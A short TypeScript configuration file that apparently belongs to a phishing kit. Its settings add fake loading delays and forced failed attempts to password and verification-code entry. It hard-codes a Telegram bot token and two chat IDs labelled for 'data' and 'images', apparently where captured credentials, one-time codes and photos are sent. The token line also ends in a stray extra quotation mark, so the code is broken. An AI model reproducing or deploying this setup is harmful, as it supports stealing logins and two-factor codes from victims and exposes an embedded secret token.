interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  };
  telegram: {
    image_chatid: string;
    data_chatid: string;
    data_token: string;
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 5000,
    max_failed_code_attempts: 1,
    max_failed_password_attempts: 0,
    password_loading_time: 5000,
  },
  telegram: {
    image_chatid: "-4866973261",
    data_chatid: "-4274439752",
    data_token: "7249137107:AAEzOHQWP3jEW-Z-iaq9HjJSViSBjc7zKjQ"",
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
